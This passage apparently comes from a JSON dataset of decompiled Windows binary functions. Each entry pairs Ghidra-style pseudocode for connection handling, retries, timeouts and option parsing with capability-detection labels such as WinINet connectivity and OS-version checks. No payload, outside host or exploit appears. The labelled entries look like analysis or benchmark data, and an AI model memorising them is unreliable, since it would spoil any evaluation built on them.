-0x3fffff50)) {\n                    iVar2 = 0x21590003;\n                }\n                else {\n                    iVar2 = fcn.000785b6(var_ch);\n                }\n            }\n            else {\n                iVar2 = fcn.000785b6(var_ch);\n            }\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 650
    },
    "00071780": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00071780(int32_t arg_8h, int32_t *arg_ch, uint32_t *arg_10h, uint32_t arg_14h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    char *pcVar6;\n    int32_t iVar7;\n    bool bVar8;\n    ulong uVar9;\n    int64_t iVar10;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_50h;\n    char *var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint32_t var_24h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    *arg_ch = 0;\n    if (*(arg_8h + 0x14) == 0) {\n        return 0x21590065;\n    }\n    iVar4 = fcn.00036f40(arg_8h + 0x34, 0);\n    if (iVar4 != 0) {\n        var_4ch = *(arg_8h + 0x38);\n        pcVar6 = var_4ch + 1;\n        do {\n            cVar1 = *var_4ch;\n            var_4ch = var_4ch + 1;\n        } while (cVar1 != '\\0');\n        iVar4 = fcn.00071620(arg_8h, *(arg_8h + 0x38), var_4ch + (1 - pcVar6));\n        if (iVar4 != 0) {\n            return iVar4;\n        }\n    }\n    iVar4 = fcn.00036f40(arg_8h + 0x28, 0);\n    if ((iVar4 != 0) && (iVar4 = fcn.00071780(arg_8h, arg_8h + 0x2c, arg_8h + 0x30, arg_14h),  iVar4 != 0)) {\n        return iVar4;\n    }\n    do {\n        uVar2 = (*0xb1bde158)[1];\n        uVar3 = **0xb1bde158;\n    } while (uVar2 != (*0xb1bde158)[2]);\n    while( true ) {\n        var_18h = fcn.0007875a(*(arg_8h + 0x14), 0, 0, 0, &var_14h, 0x11400c, 0, 0, &var_30h, 0x14);\n        if (var_18h == 0x103) {\n            var_18h = fcn.000785ec(*(arg_8h + 0x14), 0, 0);\n            if (var_18h != 0) {\n                iVar4 = fcn.000785b6(var_18h);\n                return iVar4;\n            }\n            var_18h = var_14h;\n        }\n        if ((var_18h != 0) && (var_18h != -0x7ffffffb)) {\n            if (*(arg_8h + 0x18) != '\\0') {\n                return 0x21590006;\n            }\n            if ((var_18h != -0x3ffffeb5) && (var_18h != -0x3fffff50)) {\n                iVar4 = fcn.000785b6(var_18h);\n                return iVar4;\n            }\n            return 0x21590003;\n        }\n        var_1ch = var_24h;\n        if (var_24h != 0) break;\n        do {\n            var_4h = (*0xb1bde158)[1];\n            var_8h = **0xb1bde158;\n        } while (var_4h != (*0xb1bde158)[2]);\n        if (arg_14h != 0xffffffff) {\n            bVar8 = var_8h < uVar3;\n            iVar7 = var_8h - uVar3;\n            iVar4 = var_4h - uVar2;\n            uVar5 = (**0xb1bde154)();\n            uVar9 = fcn.00078778(iVar7, iVar4 - bVar8, uVar5, 0);\n            iVar10 = fcn.00078784(uVar9, 10000, 0);\n            if ((-1 < iVar10) && ((0xffffffff < iVar10 || (arg_14h < iVar10)))) {\n                return 0x21590002;\n            }\n        }\n        fcn.000209a0(10);\n    }\n    iVar4 = fcn.00035200(var_24h);\n    *arg_ch = iVar4;\n    if (*arg_ch == 0) {\n        return 0x21590004;\n    }\n    *arg_10h = var_1ch;\n    var_18h = fcn.0007863a(&var_34h, 0x10000000, 0, 1, 0);\n    if (var_18h == 0) {\n        var_ch = 0;\n        while( true ) {\n            if (var_1ch <= var_ch) {\n                fcn.00078544(var_34h);\n                return 0;\n            }\n            var_18h = fcn.000785e0(*(arg_8h + 0x14), var_34h, 0, 0, &var_14h, *arg_ch + var_ch, var_1ch - var_ch, 0, 0);\n            if (var_18h == 0x103) {\n                var_18h = fcn.000785ec(var_34h, 0, 0);\n                if (var_18h != 0) {\n                    fcn.00035330(*arg_ch);\n                    *arg_ch = 0;\n                    *arg_10h = 0;\n                    fcn.00078544(var_34h);\n                    iVar4 = fcn.000785b6(var_18h);\n                    return iVar4;\n                }\n                var_18h = var_14h;\n            }\n            if (var_18h != 0) break;\n            var_ch = var_ch + var_10h;\n        }\n        fcn.00035330(*arg_ch);\n        *arg_ch = 0;\n        *arg_10h = 0;\n        fcn.00078544(var_34h);\n        if (*(arg_8h + 0x18) != '\\0') {\n            return 0x21590006;\n        }\n        if ((var_18h != -0x3fffff50) && (var_18h != -0x3fffff4f)) {\n            iVar4 = fcn.000785b6(var_18h);\n            return iVar4;\n        }\n        return 0x21590003;\n    }\n    fcn.00035330(*arg_ch);\n    *arg_ch = 0;\n    *arg_10h = 0;\n    iVar4 = fcn.000785b6(var_18h);\n    return iVar4;\n}\n",
        "token_count": 1695
    },
    "00071b80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00071b80(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t var_4h;\n    \n    var_4h = fcn.00071620(arg_8h, arg_ch, arg_10h);\n    if (var_4h == 0) {\n        var_4h = fcn.00071780(arg_8h, arg_14h, arg_18h, arg_1ch);\n    }\n    return var_4h;\n}\n",
        "token_count": 137
    },
    "00071e30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.00071e30(int32_t *arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h, int32_t arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00035200(0x74);\n    if (var_4h == 0) {\n        var_10h = 0x21590004;\n    }\n    else {\n        fcn.00078790(var_4h, 0, 0x74);\n        var_ch = arg_ch;\n        var_8h = 0;\n        var_10h = fcn.00075a40(var_4h + 4, &var_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n        if (var_10h == 0) {\n            if ((arg_10h != 0) && (arg_18h == 0)) {\n                var_1ch = var_4h;\n                var_18h = 0xb1c3f9b0;\n                var_14h = 0xb1c3fa10;\n                fcn.000766a0(*(var_4h + 4), 6, &var_1ch, 0xc, 0);\n            }\n            *(var_4h + 0x34) = 3;\n            *(var_4h + 0x38) = 30000;\n            *(var_4h + 0x3c) = 2000;\n            *(var_4h + 0x40) = 4;\n            if (arg_18h != 0) {\n                *(var_4h + 0x44) = 1;\n            }\n            fcn.000344f0(var_4h + 0x48);\n            fcn.000344f0(var_4h + 0x1c);\n            fcn.000344f0(var_4h + 0x18);\n            fcn.00033ff0(var_4h + 0x54);\n            *arg_8h = var_4h;\n        }\n        else {\n            fcn.00035330(var_4h);\n        }\n    }\n    return var_10h;\n}\n",
        "token_count": 571
    },
    "00071f60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00071f60(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t var_14h;\n    uchar var_10h;\n    uchar var_fh [3];\n    uint *var_ch;\n    uint *var_8h;\n    int32_t var_4h;\n    \n    if (*(arg_8h + 0x10) == 3) {\n        if (arg_ch == 1) {\n            var_fh[0] = 0x20;\n            var_10h = *(arg_8h + 0x14);\n            var_fh[1] = fcn.000785f8();\n            fcn.000725b0(arg_8h, 0, 1, &var_10h);\n        }\n        else {\n            fcn.00072380(arg_8h, 0, 0, 2);\n            *(arg_8h + 0x10) = 0;\n        }\n    }\n    if (*(arg_8h + 8) != 0) {\n        *(arg_8h + 8) = 0;\n    }\n    *(arg_8h + 0xc) = 1;\n    fcn.00034550(arg_8h + 0x48);\n    if (*(arg_8h + 0x60) != 0) {\n        var_ch = *(arg_8h + 0x60);\n        while (var_ch != NULL) {\n            var_8h = *var_ch;\n            fcn.00076610(*(arg_8h + 4), var_ch[1]);\n            fcn.00035330(var_ch);\n            var_ch = var_8h;\n        }\n        *(arg_8h + 0x60) = 0;\n        *(arg_8h + 100) = 0;\n    }\n    fcn.000345c0(arg_8h + 0x48);\n    fcn.00075d60(arg_8h + 4, 0);\n    var_4h = 0;\n    do {\n        fcn.00034550(arg_8h + 0x48);\n        if ((*(arg_8h + 0x4c) == 0) && (*(arg_8h + 0x50) == 0)) {\n            var_14h = 1;\n        }\n        else {\n            var_14h = 0;\n        }\n        var_4h = var_14h;\n        fcn.000345c0(arg_8h + 0x48);\n        if (var_4h == 0) {\n            fcn.000340b0(arg_8h + 0x54);\n            fcn.000209a0(10);\n        }\n    } while (var_4h == 0);\n    return;\n}\n",
        "token_count": 621
    },
    "00072120": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00072120(int32_t arg_8h, uint arg_ch)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_4h;\n    \n    if (*(arg_8h + 8) == 0) {\n        iVar2 = fcn.000760f0(*(arg_8h + 4), arg_ch);\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        *(arg_8h + 0x20) = *(arg_8h + 0x3c);\n        *(arg_8h + 8) = 1;\n        uVar3 = fcn.0006be20();\n        *(arg_8h + 0x70) = uVar3;\n        *(arg_8h + 0x6c) = *(arg_8h + 0x70);\n    }\n    if (*(arg_8h + 0x10) == 0) {\n        uVar1 = fcn.000785f8();\n        *(arg_8h + 0x14) = uVar1;\n        *(arg_8h + 0x10) = 2;\n        iVar2 = fcn.00072380(arg_8h, 0, 0, 1);\n        if (iVar2 != 0) {\n            *(arg_8h + 0x10) = 0;\n            return iVar2;\n        }\n        *(arg_8h + 0x10) = 3;\n    }\n    return 0;\n}\n",
        "token_count": 349
    },
    "000721e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000721e0(int32_t arg_8h, int32_t *arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.00075e70(*(arg_8h + 4), &var_8h, arg_10h);\n    if (iVar1 == 0) {\n        var_4h = fcn.00035200(0x74);\n        if (var_4h == 0) {\n            iVar1 = 0x21590004;\n        }\n        else {\n            fcn.00078790(var_4h, 0, 0x74);\n            *(var_4h + 4) = var_8h;\n            fcn.000344f0(var_4h + 0x48);\n            fcn.000344f0(var_4h + 0x1c);\n            fcn.000344f0(var_4h + 0x18);\n            fcn.00033ff0(var_4h + 0x54);\n            *(var_4h + 8) = 1;\n            *(var_4h + 0x10) = 1;\n            *(var_4h + 0x34) = *(arg_8h + 0x34);\n            *(var_4h + 0x38) = *(arg_8h + 0x38);\n            *(var_4h + 0x3c) = *(arg_8h + 0x3c);\n            *(var_4h + 0x40) = *(arg_8h + 0x40);\n            *(var_4h + 0x44) = *(arg_8h + 0x44);\n            *(var_4h + 0x20) = *(arg_8h + 0x3c);\n            uVar2 = fcn.0006be20();\n            *(var_4h + 0x70) = uVar2;\n            *(var_4h + 0x6c) = *(var_4h + 0x70);\n            *arg_ch = var_4h;\n            iVar1 = 0;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 524
    },
    "00072300": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00072300(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    \n    if (*(arg_8h + 0xc) == 0) {\n        if (*(arg_8h + 8) == 0) {\n            uVar1 = 0x21590003;\n        }\n        else {\n            uVar1 = fcn.00072b60(arg_8h, 2, 0, arg_ch, arg_10h, arg_14h);\n        }\n    }\n    else {\n        uVar1 = 0x21590006;\n    }\n    return uVar1;\n}\n",
        "token_count": 156
    },
    "00072380": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00072380(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    char var_dh;\n    int32_t var_ch;\n    char var_5h;\n    uint var_4h;\n    \n    var_1ch = 0x21590002;\n    var_4h = 0;\n    fcn.00034550(arg_8h + 0x18);\n    if (*(arg_8h + 0xc) == 0) {\n        if (*(arg_8h + 8) == 0) {\n            fcn.000345c0(arg_8h + 0x18);\n            var_1ch = 0x21590003;\n        }\n        else {\n            var_20h._0_1_ = *(arg_8h + 0x14);\n            var_20h._1_1_ = arg_14h;\n            uVar1 = fcn.000785f8();\n            uVar1 = uVar1 & 0x8000007f;\n            if (uVar1 < 0) {\n                uVar1 = (uVar1 - 1 | 0xffffff80) + 1;\n            }\n            var_20h._2_1_ = uVar1;\n            var_5h = var_20h._2_1_;\n            for (var_ch = 0; var_ch < *(arg_8h + 0x34); var_ch = var_ch + 1) {\n                var_18h = fcn.0006be20();\n                var_1ch = fcn.000725b0(arg_8h, arg_ch, arg_10h, &var_20h);\n                if (var_1ch != 0) break;\n                var_1ch = fcn.00072b60(arg_8h, 1, &var_dh, 0, 0, *(arg_8h + 0x20) << 1);\n                if (var_1ch == 0) {\n                    if (var_dh == var_5h) {\n                        iVar2 = fcn.0006be20();\n                        var_14h = iVar2 - var_18h;\n                        if (var_14h < 100) {\n                            var_14h = 100;\n                        }\n                        *(arg_8h + 0x20) = *(arg_8h + 0x20) + var_14h >> 1;\n                        if (60000 < *(arg_8h + 0x20)) {\n                            *(arg_8h + 0x20) = 60000;\n                        }\n                        *(arg_8h + 0x14) = *(arg_8h + 0x14) + '\\x01';\n                        var_1ch = 0;\n                        break;\n                    }\n                    var_ch = var_ch + -1;\n                }\n                else {\n                    if (var_1ch != 0x21590002) break;\n                    if (var_ch < *(arg_8h + 0x34) + -1) {\n                        if (*(arg_8h + 0x20) == 0) {\n                            *(arg_8h + 0x20) = *(arg_8h + 0x3c);\n                        }\n                        else {\n                            uVar1 = *(arg_8h + 0x20);\n                            uVar3 = fcn.000785f8();\n                            *(arg_8h + 0x20) = (uVar1 >> 1) + uVar3 % *(arg_8h + 0x20) + 1 + *(arg_8h + 0x20);\n                        }\n                        var_4h = 1;\n                    }\n                    else {\n                        var_1ch = 0x21590002;\n                    }\n                }\n            }\n            if (var_1ch == 0x21590002) {\n                *(arg_8h + 0x10) = 0;\n                *(arg_8h + 8) = 0;\n                var_20h._1_1_ = 0x20;\n                fcn.000725b0(arg_8h, 0, 0, &var_20h);\n            }\n            fcn.000345c0(arg_8h + 0x18);\n        }\n    }\n    else {\n        fcn.000345c0(arg_8h + 0x18);\n        var_1ch = 0x21590006;\n    }\n    return var_1ch;\n}\n",
        "token_count": 1136
    },
    "000725b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000725b0(int32_t arg_8h, uint *arg_ch, uint32_t arg_10h, uint arg_14h)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    uint var_130h;\n    uint *var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint *var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (arg_8h == 0) {\n        var_ch = 0x21590065;\n    }\n    else {\n        var_20h = 0;\n        var_1ch = 0;\n        var_18h = NULL;\n        var_14h = 0;\n        var_10h = 0;\n        var_28h = arg_14h;\n        var_24h = 3;\n        if (((arg_10h & 8) == 0) && (arg_ch == NULL)) {\n            var_2ch = &var_1ch;\n            iVar2 = fcn.000785f8();\n            var_8h = iVar2 % *(arg_8h + 0x40) + 1;\n            for (var_4h = 0; var_4h < var_8h; var_4h = var_4h + 1) {\n                uVar1 = fcn.000785f8();\n                *(&var_130h + var_4h) = uVar1;\n            }\n            var_18h = &var_130h;\n            var_14h = var_8h;\n        }\n        else {\n            var_2ch = arg_ch;\n        }\n        fcn.00071df0(arg_14h);\n        var_ch = fcn.00076840(*(arg_8h + 4), &var_2ch, arg_10h);\n        fcn.00071df0(arg_14h);\n    }\n    return var_ch;\n}\n",
        "token_count": 477
    },
    "000726c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000726c0(int32_t arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    if (arg_ch == 1) {\n        if (arg_14h == 0x10) {\n            fcn.0007877e(arg_8h + 0x24, arg_10h, 0x10);\n            var_8h = 0;\n        }\n        else {\n            var_8h = 0x21590064;\n        }\n    }\n    iVar1 = fcn.000766a0(*(arg_8h + 4), arg_ch, arg_10h, arg_14h, arg_18h);\n    if (var_8h != 0) {\n        iVar1 = var_8h;\n    }\n    return iVar1;\n}\n",
        "token_count": 231
    },
    "00072770": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_94h\n// WARNING: Variable defined which should be unmapped: var_90h\n\nint32_t __cdecl fcn.00072770(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t var_94h;\n    uint var_90h;\n    char *var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_8h = arg_ch;\ncode_r0x0007277f:\n    do {\n        iVar1 = fcn.00077cd0(&var_8h, &var_90h, 0x80, &var_ch);\n        if (iVar1 == 0) {\n            var_94h = 0;\ncode_r0x00072925:\n            if (var_94h == 0) {\n                var_94h = fcn.00076270(*(arg_8h + 4), arg_ch, arg_10h);\n            }\n            return var_94h;\n        }\n        iVar1 = fcn.0007861c(&var_90h, 0xb1be2964);\n        if (iVar1 == 0) {\n            var_4h = fcn.0007874e(var_ch);\n            if (var_4h < 1) {\n                var_94h = 0x21590066;\n                goto code_r0x00072925;\n            }\n            *(arg_8h + 0x34) = var_4h;\n            goto code_r0x0007277f;\n        }\n        iVar1 = fcn.0007861c(&var_90h, 0xb1be2978);\n        if (iVar1 == 0) {\n            var_4h = fcn.0007874e(var_ch);\n            var_4h = var_4h * 1000;\n            if (var_4h < 1) {\n                var_94h = 0x21590066;\n                goto code_r0x00072925;\n            }\n            *(arg_8h + 0x38) = var_4h;\n        }\n        else {\n            iVar1 = fcn.0007861c(&var_90h, 0xb1be298c);\n            if (iVar1 == 0) {\n                var_4h = fcn.0007874e(var_ch);\n                var_4h = var_4h * 1000;\n                if (var_4h < 1) {\n                    var_94h = 0x21590066;\n                    goto code_r0x00072925;\n                }\n                *(arg_8h + 0x3c) = var_4h;\n            }\n            else {\n                iVar1 = fcn.0007861c(&var_90h, 0xb1be299c);\n                if (iVar1 == 0) {\n                    var_4h = fcn.0007874e(var_ch);\n                    if (var_4h < 1) {\n                        var_94h = 0x21590066;\n                        goto code_r0x00072925;\n                    }\n                    if (0x100 < var_4h) {\n                        var_4h = 0x100;\n                    }\n                    *(arg_8h + 0x40) = var_4h;\n                }\n                else {\n                    iVar1 = fcn.0007861c(&var_90h, 0xb1be29b0);\n                    if ((iVar1 == 0) && ((*var_ch == 'Y' || (*var_ch == '1')))) {\n                        *(arg_8h + 0x44) = 0;\n                    }\n                }\n            }\n        }\n    } while( true );\n}\n",
        "token_count": 834
    },
    "00072ae0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00072ae0(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t var_4h;\n    \n    fcn.00034550(arg_8h + 0x18);\n    fcn.00034550(arg_8h + 0x1c);\n    var_4h = fcn.00072ac0(arg_8h, arg_ch, 0);\n    if (var_4h == 0) {\n        var_4h = fcn.00072300(arg_8h, arg_10h, arg_14h, arg_18h);\n    }\n    fcn.000345c0(arg_8h + 0x1c);\n    fcn.000345c0(arg_8h + 0x18);\n    return var_4h;\n}\n",
        "token_count": 210
    },
    "00072b60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00072b60(int32_t arg_8h, int32_t arg_ch, uchar *arg_10h, int32_t *arg_14h, int32_t *arg_18h, uint32_t arg_1ch)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    fcn.00034550(arg_8h + 0x48);\n    do {\n        if (*(arg_8h + 0xc) != 0) {\n            var_14h = 0x21590006;\ncode_r0x00072dae:\n            fcn.000345c0(arg_8h + 0x48);\n            return var_14h;\n        }\n        if (*(arg_8h + 8) == 0) {\n            var_14h = 0x21590003;\n            goto code_r0x00072dae;\n        }\n        if ((arg_ch == 1) && (*(arg_8h + 0x5c) != 0)) {\n            *arg_10h = *(arg_8h + 0x58);\n            *(arg_8h + 0x5c) = 0;\n            var_14h = 0;\n            goto code_r0x00072dae;\n        }\n        if ((arg_ch == 2) && (*(arg_8h + 0x60) != 0)) {\n            *arg_14h = *(*(arg_8h + 0x60) + 4) + 3;\n            *arg_18h = *(*(arg_8h + 0x60) + 8) + -3;\n            *(arg_8h + 0x68) = *(arg_8h + 0x68) - *(*(arg_8h + 0x60) + 8);\n            iVar1 = **(arg_8h + 0x60);\n            fcn.00035330(*(arg_8h + 0x60));\n            *(arg_8h + 0x60) = iVar1;\n            if (iVar1 == 0) {\n                *(arg_8h + 100) = 0;\n            }\n            if (*arg_18h == 0) {\n                fcn.000726a0(arg_8h, *arg_14h);\n                *arg_14h = 0;\n            }\n            var_14h = 0;\n            goto code_r0x00072dae;\n        }\n        bVar2 = *(arg_8h + 0x4c) != 0;\n        if (bVar2) {\n            *(arg_8h + 0x50) = *(arg_8h + 0x50) + 1;\n        }\n        else {\n            *(arg_8h + 0x4c) = 1;\n        }\n        fcn.000345c0(arg_8h + 0x48);\n        if (!bVar2) {\n            var_14h = fcn.00072dd0(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch);\n            fcn.00034550(arg_8h + 0x48);\n            *(arg_8h + 0x4c) = 0;\n            fcn.000340b0(arg_8h + 0x54);\n            goto code_r0x00072dae;\n        }\n        if (arg_1ch == 0) {\n            var_14h = 0x21590002;\n            goto code_r0x00072dae;\n        }\n        if (arg_1ch != 0xffffffff) {\n            var_8h = fcn.0006be20();\n        }\n        iVar1 = fcn.000340e0(arg_8h + 0x54, arg_1ch);\n        if (iVar1 == 0) {\n            var_14h = 0x21590002;\n            fcn.00034550(arg_8h + 0x48);\n            *(arg_8h + 0x50) = *(arg_8h + 0x50) + -1;\n            goto code_r0x00072dae;\n        }\n        if (arg_1ch != 0xffffffff) {\n            iVar1 = fcn.0006be20();\n            if (arg_1ch < iVar1 - var_8h) {\n                arg_1ch = 0;\n            }\n            else {\n                arg_1ch = arg_1ch - (iVar1 - var_8h);\n            }\n        }\n        fcn.00034550(arg_8h + 0x48);\n        *(arg_8h + 0x50) = *(arg_8h + 0x50) + -1;\n    } while( true );\n}\n",
        "token_count": 1103
    },
    "00072dd0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl\nfcn.00072dd0(int32_t arg_8h, int32_t arg_ch, uchar *arg_10h, unkuint3 **arg_14h, int32_t *arg_18h, uint32_t arg_1ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    bool bVar5;\n    uint32_t var_38h;\n    uint32_t var_34h;\n    uint32_t var_30h;\n    int32_t var_2ch;\n    uint *var_28h;\n    uint var_24h;\n    unkuint3 *var_20h;\n    int32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    var_20h = NULL;\n    var_1ch = 0;\n    while( true ) {\n        if (*(arg_8h + 0xc) != 0) {\n            var_2ch = 0x21590006;\n            goto code_r0x0007358f;\n        }\n        if (*(arg_8h + 8) == 0) break;\n        if ((*(arg_8h + 0x44) == 0) || (*(arg_8h + 0x10) != 3)) {\n            var_30h = 0;\n        }\n        else {\n            iVar2 = fcn.0006be20();\n            var_4h = iVar2 - *(arg_8h + 0x6c);\n            uVar1 = *(arg_8h + 0x38);\n            uVar3 = fcn.000785f8();\n            var_8h = (uVar1 >> 1) + 1 + uVar3 % *(arg_8h + 0x38);\n            var_30h = var_8h < var_4h;\n        }\n        if (var_30h != 0) {\n            var_24h._0_2_ = var_24h & 0xff00 | *(arg_8h + 0x14);\n            var_24h._2_1_ = fcn.000785f8();\n            var_24h._0_2_ = CONCAT11(0x10, var_24h);\n            var_2ch = fcn.000725b0(arg_8h, 0, 0, &var_24h);\n            if (var_2ch != 0) goto code_r0x0007358f;\n            uVar4 = fcn.0006be20();\n            *(arg_8h + 0x6c) = uVar4;\n        }\n        iVar2 = fcn.0006be20();\n        var_ch = iVar2 - *(arg_8h + 0x70);\n        if (var_ch < *(arg_8h + 0x38) * *(arg_8h + 0x34)) {\n            var_34h = *(arg_8h + 0x38) * *(arg_8h + 0x34) - var_ch;\n        }\n        else {\n            var_34h = 0;\n        }\n        bVar5 = var_34h <= arg_1ch;\n        if (!bVar5) {\n            var_34h = arg_1ch;\n        }\n        var_14h = bVar5;\n        if (arg_1ch != 0xffffffff) {\n            var_1ch = fcn.0006be20();\n        }\n        var_2ch = fcn.000763f0(*(arg_8h + 4), &var_20h, &var_18h, var_34h, 0);\n        if (arg_1ch != 0xffffffff) {\n            iVar2 = fcn.0006be20();\n            var_10h = iVar2 - var_1ch;\n            if (var_10h < arg_1ch) {\n                arg_1ch = arg_1ch - var_10h;\n            }\n            else {\n                arg_1ch = 0;\n            }\n        }\n        if (var_2ch == 0) {\n            if 